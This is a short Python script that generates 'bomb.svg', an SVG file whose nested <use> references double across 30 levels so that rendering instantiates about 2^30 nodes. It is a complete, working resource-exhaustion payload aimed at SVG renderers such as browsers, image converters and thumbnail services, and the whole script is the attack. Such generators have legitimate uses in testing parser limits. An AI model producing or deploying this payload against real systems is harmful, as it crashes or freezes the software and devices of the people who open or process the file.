#!/usr/bin/env python3
# <use> doubling ladder: N levels -> 2^N instantiated nodes.
N = 30
out = ['<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">']
out.append('<g id="x0"><rect width="1" height="1"/></g>')
for i in range(1, N+1):
    out.append(f'<g id="x{i}"><use xlink:href="#x{i-1}"/><use xlink:href="#x{i-1}"/></g>')
out.append(f'<use xlink:href="#x{N}"/></svg>')
open("bomb.svg","w").write("\n".join(out))
print(f"bomb.svg written: {N} levels -> 2^{N} nodes")
